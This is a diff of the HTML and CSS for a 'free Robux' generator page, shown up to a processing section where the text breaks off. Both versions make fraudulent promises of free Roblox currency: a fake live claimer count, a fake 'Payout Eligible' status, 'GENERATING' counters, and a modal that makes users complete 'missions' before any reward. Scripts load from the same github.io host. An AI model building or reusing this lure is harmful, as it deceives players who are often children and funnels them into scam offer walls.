@@ -1,30 +1,21 @@
-<!DOCTYPE html>
-<html lang="en">
 
 
+<!DOCTYPE html><html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Receive Robux</title>
-
-
-  <link rel="preload" as="image" href="https://rbbbxxxx66.github.io/rbbxxx/pnKIeyU.webp">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js" defer></script>
-  
-  <!-- Font Awesome CDN -->
-   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-   
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com/">
-  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@400;600;700;900&amp;display=swap">
+    <link href="https://rbbbxxxx66.github.io/rbbxxx/2048px-ROBUX_2014_Logo.svg.png" rel="icon" type="image/x-icon">
+    <title>BestRBX</title>
+     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-  <link rel="stylesheet" href="https://rbbbxxxx66.github.io/rbbxxx/style.css">
-  <script src="https://rbbbxxxx66.github.io/rbbxxx/main.js" defer></script>
-  <script src="https://rbbbxxxx66.github.io/rbbxxx/Proof.js"></script>
-
- <!-- Google tag (gtag.js) -->
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link rel="stylesheet" href="https://rbbbxxxx66.github.io/rbbxxx/all.min.css">
+    <script src="https://rbbbxxxx66.github.io/rbbxxx/jquery.min.js"></script>
+	
+	 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-3PQ1B4D850"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -35,169 +26,872 @@
 </script>
 
 
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&amp;display=swap');
+        
+        body {
+            font-family: 'Montserrat', Helvetica, Arial, sans-serif;
+            background-color: #f3f4f6 !important;
+        }
+        
+        .robux-icon {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            background-image: url('https://rbbbxxxx66.github.io/rbbxxx/p_36057rmxc0.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        
+       .shine-button {
+    position: relative;
+    overflow: hidden;
+}
+
+/* Efectul de shine */
+.shine-button::after {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: linear-gradient(
+        to right,
+        rgba(255,255,255,0) 0%,
+        rgba(255,255,255,0.25) 50%,
+        rgba(255,255,255,0) 100%
+    );
+    transform: rotate(30deg);
+    animation: shine 3.5s infinite;
+    z-index: 1;
+    pointer-events: none;
+}
+
+/* Textul + iconul DEASUPRA shine-ului */
+.shine-button i,
+.shine-button span {
+    position: relative;
+    z-index: 2;
+}
+
+/* Animația de shine */
+@keyframes shine {
+    0% {
+        transform: translate(-100%, -100%) rotate(30deg);
+    }
+    100% {
+        transform: translate(100%, 100%) rotate(30deg);
+    }
+}
+
+/* Pulse */
+.pulse {
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(1);
+        box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7);
+    }
+    70% {
+        transform: scale(1.05);
+        box-shadow: 0 0 0 10px rgba(255, 0, 0, 0);
+    }
+    100% {
+        transform: scale(1);
+        box-shadow: 0 0 0 0 rgba(255, 0, 0, 0);
+    }
+}
+        
+        .bounce {
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .robux-glow {
+            box-shadow: 0 0 15px 5px rgba(0, 176, 111, 0.4);
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,.35);
+            border-top-color: white;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 700ms linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #ef4444;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            display: none;
+        }
+
+        .success-message {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: #10b981;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            display: none;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .currency-option {
+            background: white;
+            border: 3px solid #e5e7eb;
+            border-radius: 14px;
+            padding: 18px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .currency-option:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+
+        .currency-option.selected {
+            border-color: #1291eb;
+            background: rgba(18, 145, 235, 0.1);
+            transform: translateY(-5px);
+        }
+
+        .currency-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .currency-icon-wrapper img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.2));
+        }
+
+        .currency-name {
+            font-size: 1.4rem;
+            font-weight: 800;
+            color: #1f2937;
+            margin-bottom: 6px;
+        }
+
+        .currency-description {
+            font-size: 0.85rem;
+            color: #6b7280;
+            margin-bottom: 10px;
+        }
+        
+        .currency-select-btn {
+            font-size: 0.85rem;
+            background: #9333ea;
+            color: white;
+            padding: 6px 18px;
+            border-radius: 6px;
+            font-weight: 700;
+            display: inline-block;
+        }
+
+        .diamond-option {
+            background: white;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            opacity: 0;
+            transform: scale(0.3);
+            animation: popIn 0.5s ease-out forwards;
+        }
+
+        .diamond-option:nth-child(1) {
+            animation-delay: 0.1s;
+        }
+
+        .diamond-option:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .diamond-option:nth-child(3) {
+            animation-delay: 0.3s;
+        }
+
+        .diamond-option:nth-child(4) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes popIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.3);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .diamond-option:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .diamond-option.selected {
+            border-color: #1291eb;
+            background: rgba(18, 145, 235, 0.1);
+            transform: translateY(-3px) scale(0.95);
+        }
+
+        .diamond-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 8px;
+            object-fit: contain;
+            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.15));
+        }
+
+        .diamond-amount {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #1f2937;
+            margin-top: 8px;
+        }
+
+        .notification-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            max-width: 350px;
+        }
+
+        .notification {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            animation: slideInRight 0.5s ease-out, slideOutRight 0.5s ease-in 4.5s;
+            border-left: 4px solid #10b981;
+        }
+
+        @keyframes slideInRight {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideOutRight {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+        }
+
+        .notification-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            margin-right: 12px;
+            border: 2px solid #10b981;
+        }
+
+        .notification-content {
+            flex: 1;
+        }
+
+        .notification-username {
+            font-weight: 700;
+            color: #1f2937;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .notification-message {
+            font-size: 12px;
+            color: #6b7280;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .notification-icon {
+            color: #10b981;
+            font-size: 18px;
+        }
+
+        .stats-container {
+            background: linear-gradient(145deg, rgba(255,255,255,0.95) 0%, rgba(255,255,255,0.9) 100%);
+            backdrop-filter: blur(20px);
+            border-radius: 16px;
+            padding: 14px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .stats-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(16, 185, 129, 0.1) 0%, transparent 70%);
+            animation: rotate 15s linear infinite;
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .stats-title {
+            text-align: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: #6b7280;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            position: relative;
+            z-index: 1;
+        }
+
+.stats-grid {
+    display: grid;
+    grid-template-columns: 1fr; /* only one column */
+    gap: 10px;
+}
+
+        .stat-item {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(18, 145, 235, 0.1) 100%);
+            border: 2px solid rgba(16, 185, 129, 0.3);
+            border-radius: 10px;
+            padding: 8px;
+            text-align: center;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
+            border-color: #10b981;
+        }
+
+        .stat-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .stat-item:hover::before {
+            left: 100%;
+        }
+
+        .stat-icon {
+            font-size: 22px;
+            margin-bottom: 4px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+        }
+
+        .stat-number {
+            font-size: 18px;
+            font-weight: 900;
+            color: #10b981;
+            margin-bottom: 2px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .stat-label {
+            font-size: 9px;
+            font-weight: 700;
+            color: #6b7280;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .stat-pulse {
+            animation: stat-pulse 2s infinite;
+        }
+
+        @keyframes stat-pulse {
+            0%, 100% { 
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% { 
+                transform: scale(1.05);
+                opacity: 0.9;
+            }
+        }
+
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(239, 68, 68, 0.15);
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            font-weight: 700;
+            color: #ef4444;
+            margin-bottom: 6px;
+        }
+
+        .live-dot {
+            width: 7px;
+            height: 7px;
+            background: #ef4444;
+            border-radius: 50%;
+            animation: live-blink 1.5s infinite;
+        }
+
+        @keyframes live-blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .currency-generation-display {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding: 20px;
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.1) 0%, rgba(16, 185, 129, 0.1) 100%);
+            border-radius: 16px;
+            border: 2px solid rgba(147, 51, 234, 0.3);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .generation-icon {
+            width: 50px;
+            height: 50px;
+            animation: pulse-icon 1.5s infinite;
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { 
+                transform: scale(1);
+                filter: drop-shadow(0 0 5px rgba(147, 51, 234, 0.5));
+            }
+            50% { 
+                transform: scale(1.1);
+                filter: drop-shadow(0 0 15px rgba(147, 51, 234, 0.8));
+            }
+        }
+
+        .generation-counter {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: #9333ea;
+            text-shadow: 0 2px 10px rgba(147, 51, 234, 0.3);
+            animation: counter-glow 2s infinite;
+        }
+
+        @keyframes counter-glow {
+            0%, 100% { 
+                text-shadow: 0 2px 10px rgba(147, 51, 234, 0.3);
+            }
+            50% { 
+                text-shadow: 0 2px 20px rgba(147, 51, 234, 0.6);
+            }
+        }
+
+        .generation-label {
+            font-size: 0.9rem;
+            color: #6b7280;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 480px) {
+            .notification-container {
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+            
+            .generation-counter {
+                font-size: 2rem;
+            }
+            
+            .generation-icon {
+                width: 40px;
+                height: 40px;
+            }
+        }
+    </style>
 </head>
-<body>
+<body class="bg-gray-100 min-h-screen transition-colors duration-200">
+    <div class="container mx-auto px-4 py-6 max-w-md">
+        <div id="notificationContainer" class="notification-container"></div>
 
-
-<div class="hidden fixed inset-0 flex items-center justify-center z-[100] bg-slate-900/80 backdrop-blur-sm px-4" id="locker-modal">
-  <div class="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm flex flex-col pop-in border border-white max-h-[90dvh] overflow-y-auto custom-scrollbar">
-<div class="relative w-full bg-slate-50 border-b border-slate-100 p-6 flex flex-col justify-center flex-shrink-0">
-      <h3 class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-4 text-left">How it works</h3>
-      <ul class="text-left space-y-3">
-        <li class="flex items-center text-[13px] font-bold text-slate-700">
-          <span class="w-6 h-6 rounded-full bg-green-100 text-green-600 flex items-center justify-center text-xs mr-3 shrink-0">1</span> 
-          Select a free mission below
-        </li>
-        <li class="flex items-center text-[13px] font-bold text-slate-700">
-          <span class="w-6 h-6 rounded-full bg-green-100 text-green-600 flex items-center justify-center text-xs mr-3 shrink-0">2</span> 
-          Complete the requirements
-        </li>
-        <li class="flex items-center text-[13px] font-bold text-slate-700">
-          <span class="w-6 h-6 rounded-full bg-green-100 text-green-600 flex items-center justify-center text-xs mr-3 shrink-0">3</span> 
-          Receive your Robux instantly
-        </li>
-      </ul>
-    </div>
-
-    <div class="p-6 text-center space-y-5">
-      <div class="flex flex-col items-center border-b border-slate-100 pb-4">
-        <h2 class="text-[18px] font-bold text-slate-800 tracking-tight uppercase">Complete your Missions</h2>
-        <p class="text-[12px] text-slate-500 mt-4 leading-relaxed px-4 font-medium">
-          The reward will be send to
-          <span id="modal-username" class="text-slate-800 font-black text-[13px]">your account</span>
-          after you complete one mission below.
-        </p>
-      </div>
-
-      <div class="space-y-3" id="offers-container">
-      </div>
-
-      <div class="pt-2 space-y-3">
-        <div class="flex items-center justify-between mb-1">
-          <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Missions Status</p>
-          <p id="status-text" class="text-[9px] font-bold text-orange-500 animate-pulse uppercase italic">Awaiting selection...</p>
+        <div class="flex justify-center mb-6">
+            <div class="relative">
+                <img src="https://rbbbxxxx66.github.io/rbbxxx/roblox.png" alt="Roblox Logo" class="h-20 object-cover">
+                <div class="absolute top-0 right-0 -mr-4 -mt-2 bg-roblox-darkgray text-white text-xs font-bold px-2 py-1 rounded-full">2025</div>
+            </div>
         </div>
-        <div class="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden">
-          <div id="status-bar" class="bg-orange-400 h-full transition-all duration-1000" style="width: 15%"></div>
+        
+        <div class="text-center mb-4">
+            <h1 class="text-3xl font-bold text-roblox-black">ROBLOX TIPS</h1>
+            <p class="text-sm text-gray-600">The latest updated online tool for Roblox</p>
         </div>
-     
-      </div>
-    </div>
-  </div>
-</div>
 
-<!-- Navbar -->
-<nav class="bg-white border-b border-slate-200 px-6 py-4 flex justify-between items-center sticky top-0 z-40">
-  <div class="flex items-center space-x-2">
-    <img src="https://rbbbxxxx66.github.io/rbbxxx/BlDJdmo.jpg" alt="Logo" class="w-6 h-6" width="24" height="24">
-    <span class="text-xs font-bold text-slate-700 uppercase tracking-tighter">Community Rewards</span>
-  </div>
-  <div class="flex items-center space-x-2 bg-slate-50 px-3 py-1 rounded-full border border-slate-200">
-    <span class="w-1.5 h-1.5 bg-green-500 rounded-full"></span>
-    <span class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Live Distribution</span>
-  </div>
-</nav>
-
-<!-- Hero -->
-<div class="relative w-full h-44 flex items-center justify-center bg-slate-900 overflow-hidden">
-  <img
-    src="https://rbbbxxxx66.github.io/rbbxxx/pnKIeyU.webp"
-    alt=""
-    width="768"
-    height="176"
-    fetchpriority="high"
-    decoding="async"
-    class="absolute inset-0 w-full h-full object-cover opacity-40"
-  >
-  <div class="relative text-center px-4">
-    <h1 class="text-2xl sm:text-3xl font-black text-white tracking-tight uppercase">Get Your Robux</h1>
-    <p class="text-green-300 text-[10px] mt-1 font-bold uppercase tracking-[0.2em]">Enter your username below to receive your reward.</p>
-  </div>
-</div>
-
-<!-- Main -->
-<main class="max-w-md mx-auto -mt-8 px-4 pb-12 relative z-10">
-  <div class="bg-white rounded-2xl shadow-xl p-6 sm:p-8 border border-slate-100">
-
-    <div id="first-content" class="space-y-6">
-      <div class="space-y-1.5 text-center">
-        <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Enter Roblox Username</label>
-        <input
-          id="username"
-          type="text"
-          placeholder="Username"
-          autocomplete="off"
-          autocorrect="off"
-          autocapitalize="off"
-          spellcheck="false"
-          class="w-full px-4 py-4 rounded-xl bg-slate-50 border border-slate-200 focus:border-green-500 outline-none transition-all text-base font-bold text-slate-700 text-center shadow-inner"
-        >
-      </div>
-      <button
-        onclick="fetchProfile()"
-        class="w-full bg-slate-800 text-white py-4 rounded-xl font-bold text-sm hover:bg-slate-900 transition-all shadow-lg active:scale-95 uppercase tracking-wide"
-      >
-        Connect Account
-      </button>
-    </div>
-
-    <div id="loading-spinner" class="hidden py-8 flex items-center justify-center flex-col text-center">
-      <div class="w-10 h-10 border-4 border-slate-100 border-t-green-500 rounded-full animate-spin"></div>
-      <span class="mt-4 text-slate-500 font-bold text-xs tracking-wide">Checking Eligibility...</span>
-    </div>
-
-    <div id="profile" class="hidden text-center py-4 bg-slate-50 rounded-xl border border-slate-100 mb-6">
-      <img id="avatar" class="w-16 h-16 mx-auto rounded-full border-2 border-white shadow-sm mb-2" width="64" height="64" loading="lazy">
-      <p id="display-name" class="text-lg font-bold text-slate-800"></p>
-      <p class="text-[9px] text-green-600 font-bold uppercase tracking-widest mt-1">Status: Payout Eligible</p>
-    </div>
-
-    <div id="resource-section" class="hidden space-y-4">
-      <p class="text-[10px] font-bold text-slate-400 text-center uppercase tracking-widest">Select Reward Amount</p>
-      <div class="grid grid-cols-2 gap-3">
-        <div onclick="selectResource(this, 800)" class="resource-option cursor-pointer bg-slate-50 p-5 rounded-2xl border-2 border-transparent hover:border-slate-200 transition-all text-center">
-          <p class="text-xl font-black text-slate-800">800</p>
-          <p class="text-[9px] text-slate-400 font-bold uppercase">Robux</p>
+        <div class="stats-container">
+            <div class="flex justify-center mb-2">
+                <div class="live-indicator">
+                    <div class="live-dot"></div>
+                    <span>LIVE TODAY</span>
+                </div>
+            </div>
+            <div class="stats-title">
+                <i class="fas fa-fire mr-1" style="color: #ef4444;"></i>
+                People Who Claimed Today
+            </div>
+            <div class="stats-grid">
+                <div class="stat-item stat-pulse">
+                    <div class="stat-icon">
+                        <div class="robux-icon" style="width: 28px; height: 28px; margin: 0 auto;"></div>
+                    </div>
+                    <div class="stat-number" id="robuxClaimers">8,547</div>
+                    <div class="stat-label">Robux Claimed</div>
+                </div>
+         
+</div></div>
+        <div id="step0" class="bg-white rounded-lg shadow-xl p-5 mb-6 transform transition-all duration-300">
+            <h2 class="text-xl font-bold text-center text-roblox-black mb-5">
+                <i class="fas fa-coins mr-2"></i> Choose Your Reward Type
+            </h2>
+            
+            <div class="grid grid-cols-2 gap-4 mb-3">
+                <div class="currency-option" data-type="robux">
+                    <div class="currency-icon-wrapper">
+                        <div class="robux-icon" style="width: 70px; height: 70px;"></div>
+                    </div>
+                    <div class="currency-name">ROBUX</div>
+                    <div class="currency-description">Roblox Currency</div>
+                    <div class="currency-select-btn">
+                        SELECT
+                    </div>
+                </div>
+                
+                <div class="currency-option" data-type="diamond">
+                    <div class="currency-icon-wrapper">
+                        <img src="https://rbbbxxxx66.github.io/rbbxxx/901289026.png" alt="Diamond">
+                    </div>
+                    <div class="currency-name">DIAMOND</div>
+                    <div class="currency-description">Premium Gems</div>
+                    <div class="currency-select-btn">
+                        SELECT
+                    </div>
+                </div>
+            </div>
         </div>
-        <div onclick="selectResource(this, 1700)" class="resource-option cursor-pointer bg-slate-50 p-5 rounded-2xl border-2 border-transparent hover:border-slate-200 transition-all text-center">
-          <p class="text-xl font-black text-slate-800">1,700</p>
-          <p class="text-[9px] text-slate-400 font-bold uppercase">Robux</p>
-        </div>
-        <div onclick="selectResource(this, 4500)" class="resource-option cursor-pointer bg-slate-50 p-5 rounded-2xl border-2 border-transparent hover:border-slate-200 transition-all text-center">
-          <p class="text-xl font-black text-slate-800">4,500</p>
-          <p class="text-[9px] text-slate-400 font-bold uppercase">Robux</p>
-        </div>
-        <div onclick="selectResource(this, 10000)" class="resource-option cursor-pointer bg-slate-50 p-5 rounded-2xl border-2 border-transparent hover:border-slate-200 transition-all text-center">
-          <p class="text-xl font-black text-slate-800">10,000</p>
-          <p class="text-[9px] text-slate-400 font-bold uppercase">Robux</p>
-        </div>
-      </div>
-      <button id="confirm-button" onclick="confirmSelection()" class="hidden w-full bg-green-600 text-white py-4 rounded-xl font-bold text-sm shadow-lg shadow-green-100 transition-all active:scale-95 uppercase tracking-wide">
-        Confirm
-      </button>
-    </div>
 
-    <div id="sending-animation" class="hidden py-4 flex flex-col space-y-3">
-      <div class="w-full bg-slate-900 rounded-lg p-4 font-mono text-[10px] text-green-400 h-28 overflow-hidden text-left">
-        <div id="log-container" class="space-y-1"></div>
-      </div>
-    </div>
+        <div id="step1" class="bg-white rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black mb-6">
+                <i class="fas fa-user mr-2"></i> Enter Your Roblox Username
+            </h2>
+            
+            <div class="mb-6 relative">
+                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                    <i class="fas fa-user text-gray-400"></i>
+                </div>
+                <input type="text" id="username" placeholder="Your Roblox Username" class="w-full pl-10 pr-4 py-4 text-base rounded-md border-2 border-gray-300 bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-roblox-red focus:border-transparent">
+            </div>
 
-    <div id="success-message" class="hidden text-center space-y-5">
-      <div class="w-12 h-12 mx-auto bg-green-100 rounded-full flex items-center justify-center" id="final-icon">
-        <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
-      </div>
-      <div>
-        <h2 id="final-title" class="text-xl font-black text-slate-800 uppercase tracking-tighter">Almost there!</h2>
-        <p id="final-desc" class="text-slate-500 text-xs mt-1 px-4">Your reward is available now!<br><br>Please click the button below and follow the instructions to <span class="font-bold text-slate-700">receive your Robux.</span></p>
-      </div>
-      <button id="claim-btn" onclick="openModal()" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold text-sm shadow-lg active:scale-95 uppercase tracking-wide">
-        Claim Robux
-      </button>
+            <button id="searchButton" class="w-full bg-[#9333ea] hover:bg-[#7a29c5] text-white font-bold py-4 px-6 rounded-md transition duration-200 ease-in-out transform hover:scale-105 shine-button mb-4">
+                <i class="fas fa-search mr-2"></i> <span id="searchButtonText">SEARCH USER</span>
+            </button>
+
+            <div id="errorMessage" class="error-message">
+                <i class="fas fa-exclamation-triangle mr-2"></i>
+                <span id="errorText">Error occurred while searching</span>
+            </div>
+
+            <div id="successMessage" class="success-message">
+                <i class="fas fa-check-circle mr-2"></i>
+                <span>User found successfully!</span>
+            </div>
+        </div>
+
+        <div id="step2" class="bg-white rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black mb-6">
+                <i class="fas fa-coins mr-2"></i> Select Robux Amount
+            </h2>
+            
+            <div class="grid grid-cols-2 gap-4 mb-8">
+                <button class="robux-btn bg-white border-2 border-gray-300 hover:border-robux-green text-roblox-black font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="800" style="opacity: 0; transform: scale(0.3); animation: popIn 0.5s ease-out 0.1s forwards;">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">800</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+                <button class="robux-btn bg-white border-2 border-gray-300 hover:border-robux-green text-roblox-black font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="2000" style="opacity: 0; transform: scale(0.3); animation: popIn 0.5s ease-out 0.2s forwards;">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">2000</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+                <button class="robux-btn bg-white border-2 border-gray-300 hover:border-robux-green text-roblox-black font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="5500" style="opacity: 0; transform: scale(0.3); animation: popIn 0.5s ease-out 0.3s forwards;">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">5500</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+                <button class="robux-btn bg-white border-2 border-gray-300 hover:border-robux-green text-roblox-black font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="10000" style="opacity: 0; transform: scale(0.3); animation: popIn 0.5s ease-out 0.4s forwards;">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">10000</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+            </div>
+        </div>
+
+        <div id="step2_5" class="bg-white rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black mb-6">
+                <i class="fas fa-gem mr-2"></i> Select Diamond Amount
+            </h2>
+            
+            <div class="grid grid-cols-2 gap-4 mb-6">
+                <div class="diamond-option" data-amount="100">
+                    <img src="https://rbbbxxxx66.github.io/rbbxxx/901289026.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">100</div>
+                    <div class="text-xs text-green-600 font-semibold mt-2">FREE</div>
+                </div>
+                <div class="diamond-option" data-amount="250">
+                    <img src="https://rbbbxxxx66.github.io/rbbxxx/901289026.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">250</div>
+                    <div class="text-xs text-green-600 font-semibold mt-2">FREE</div>
+                </div>
+                <div class="diamond-option" data-amount="700">
+                    <img src="https://rbbbxxxx66.github.io/rbbxxx/901289026.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">700</div>
+                    <div class="text-xs text-green-600 font-semibold mt-2">FREE</div>
+                </div>
+              
+            </div>
+        </div>
+
+        <div id="step3" class="bg-white rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black mb-6">
+                <i class="fas fa-cog mr-2"></i> Processing Request
+            </h2>
+            
+            <div id="currencyGenerationDisplay" class="currency-generation-display">
+                <div id="generationIconContainer"></div>
+                <div class="flex flex-col items-center">
+                    <div class="generation-counter" id="generationCounter">0</div>
+                    <div class="generation-label" id="generationLabel">GENERATING...</div>
+                </div>
+            </div>
+            
+            <div id="progressContainer">
+                <div class="mb-2 flex justify-between items-center">
+                    <span class="text-sm font-medium text-gray-700">
+                        <i class="fas fa-cog fa-spin mr-2"></i> Processing request...
+                    </span>
